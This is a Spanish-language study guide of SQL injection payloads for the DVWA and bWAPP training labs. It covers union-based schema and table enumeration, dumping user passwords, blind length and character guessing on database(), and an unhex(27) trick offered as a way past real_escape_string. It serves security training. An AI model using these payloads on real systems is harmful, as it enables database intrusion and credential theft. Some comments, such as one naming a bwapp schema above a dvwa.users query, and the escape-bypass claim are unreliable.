------------------------------------------------------------------------------
GUIÓN ORIENTATIVO PARA PROBAR DISTINTAS INYECCIONES DE SQL EN DVWA y BWAPP:
-ERROR BASED
-UNION BASED
-BLIND BASED 
------------------------------------------------------------------------------
#Para obtener obtener todos los esquemas que contienen una tabla users ...
' union select 1, table_schema from information_schema.tables where table_name = "users"#
------------------------------------------------------------------------------
#Para obtener los nombres de todas las tablas, de todos los esquemas
' union select 1, table_name from information_schema.tables#
------------------------------------------------------------------------------
#Para obtener los nombres de todas las tablas del esquema dvwa
' union select 1, table_name from information_schema.tables where table_schema="dvwa"#
------------------------------------------------------------------------------
#Para obtener los nombres de las tablas y su esquema correspondiente
' union select table_name, table_schema from information_schema.tables#
------------------------------------------------------------------------------
#Para obtener los nombres de las tablas y su esquema correspondiente ordenados por esquema (users y guestbook)
' union select table_name, table_schema from information_schema.tables order by 2#
------------------------------------------------------------------------------
#Para obtener todas las columnas de la tabla users del esquema dvwa...
' union select column_name, table_name from information_schema.columns where table_name = "users" and table_schema = "dvwa"#
------------------------------------------------------------------------------
#Para obtener todas las columnas de la tabla guestbook del esquema dvwa...
' union select column_name, table_name from information_schema.columns where table_name = "guestbook" and table_schema = "dvwa"#
------------------------------------------------------------------------------
#Para obtener el user_id y password de la tabla users del esquema bwapp (No tiene acceso)
' union select user_id, password from dvwa.users#
------------------------------------------------------------------------------
#Para obtener el comment_id y comment de la tabla guestbook del esquema dvwa 
' union select comment_id, comment from dvwa.guestbook#
------------------------------------------------------------------------------
#Para obtener el user_id y password de la users del esquema bwapp (No tiene acceso)
' union select user_id, password from bwapp.users#
------------------------------------------------------------------------------
#Para obtener el nombre del esquema de la BD con BLIND BASED:
#Buscando la longitud de la cadena del nombre del esquema:
' or length(database())=23 #
' or length(database())=5 #
.....
------------------------------------------------------------------------------
#Para obtener el nombre del esquema de la BD con BLIND BASED:
#Buscando preguntando por cada caracter de la cadena a lo largo de su longitud:
' or substring(database(),1,1)='a' #
' or substring(database(),2,1)='w'
.....
------------------------------------------------------------------------------
#Para obtener contrarrestrar la contramedida de SQLInjection 
#mysqli::real_escape_string -- mysqli_real_escape_string
#Pasamos el caracter "maldito" escondido a través de su codificación 
#hexadecimal, unhex(27) para la ':
unhex(27) or 3=3 order by 7#
------------------------------------------------------------------------------